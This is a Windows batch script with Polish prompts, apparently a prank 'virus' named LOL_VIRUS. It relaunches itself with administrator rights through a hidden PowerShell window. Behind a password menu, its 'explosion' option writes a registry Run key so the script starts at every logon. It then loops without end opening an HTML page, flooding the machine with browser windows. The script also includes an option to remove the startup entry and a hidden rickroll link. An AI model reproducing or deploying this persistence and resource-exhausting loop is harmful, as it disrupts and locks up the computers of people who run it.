@echo off
call :Adm
title Wprowadź hasło...
chcp 866
color a
cls
goto pwd

:pwd
cls
type C:\LOL_VIRUS\files\art.txt
echo Proszę wpisać hasło (? Jeśli potrzebujesz pomocy)

echo.
Set /p choice="Hasło: "
if not defined choice goto pwd
if "%choice%"=="ggytprgs" (goto vir)
if "%choice%"=="?" (goto ?)
cls
goto pwd

:vir
title LOL_VIRUS By GGYT Progs and help from DiopinYT
cls
type C:\LOL_VIRUS\files\art.txt
echo Wybierz czynnosc:
echo.
echo 1 - Rozpocznij eksplozje komputera
echo 2 - Wychodzic
echo 3 - NIE WYBIERAJ
echo 4 - Usuń wirusa ze startu
echo 5 - Centrum aktualizacji (nie wkrotce)
echo 6 - Gdzie znajduje sie wirus?
echo 7 - ???

echo.
Set /p choice="Twoj wybor: "
if not defined choice goto vir
if "%choice%"=="1" (goto q)
if "%choice%"=="2" (goto exit)
if "%choice%"=="3" (start C:\LOL_VIRUS\files\languages\pol\NOT_OPEN_ME_PLEASE.html)
if "%choice%"=="4" (goto delregstartup)
if "%choice%"=="5" (goto vir)
if "%choice%"=="6" (goto path)
if "%choice%"=="7" (goto secrpwd)
cls
goto vir

:exit
set choice=0
cls
type C:\LOL_VIRUS\files\art.txt
echo Czy na pewno chcesz wyjsc? (y/n)
Set /p choice="Wybor: "
if not defined choice goto exit
if "%choice%"=="n" (goto vir)
if "%choice%"=="y" (exit)
cls
goto exit

:q
cls
type C:\LOL_VIRUS\files\art.txt
echo Czy na pewno chcesz to zrobić? (y/n)

echo.
Set /p choice="WyBóR: "
if not defined choice goto q
if "%choice%"=="y" (goto q2)
if "%choice%"=="n" (goto vir)
cls
goto q

:q2
cls
type C:\LOL_VIRUS\files\art.txt
echo OSTATNIE OSTRZEŻENIE!!!
echo Ta aplikacja włączy się ZA KAŻDYM razem, gdy włączysz swój komputer / LAPTOPA !!! Czy jesteś pewny swoich działań? (y/n)
echo MYŚLEĆ!!!

echo.
Set /p choice="WYBÓR: "
if not defined choice goto q2
if "%choice%"=="y" (goto xd)
if "%choice%"=="n" (goto vir)

:xd
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LOL_VIRUS /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
type C:\LOL_VIRUS\files\art.txt
goto yt

:yt
cd C:\LOL_VIRUS\files\
start base.html
goto yt

:delregstartup
cls
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LOL_VIRUS
cls
type C:\LOL_VIRUS\files\art.txt
echo Usunięto wirusa z uruchamiania
pause
goto vir

:path
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo Jest w C:\LOL_VIRUS
pause
goto vir

:secrpwd
cls
type C:\LOL_VIRUS\files\art.txt
echo ZNAJDŹ KLUCZ W PLIKACH WIRUSÓW
echo n - Wychodzić

echo.
Set /p choice="Klucz: "
if not defined choice goto secrpwd
if "%choice%"=="14qw5t09" (goto rr)
if "%choice%"=="n" (goto vir)
cls
goto secrpwd

:rr
start C:\LOL_VIRUS\files\NGGYU.url
goto vir

:?
cls
type C:\LOL_VIRUS\files\art.txt
echo Przeczytaj Readme.md w moim repozytorium. Tam jest napisane.
pause
goto pwd

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)





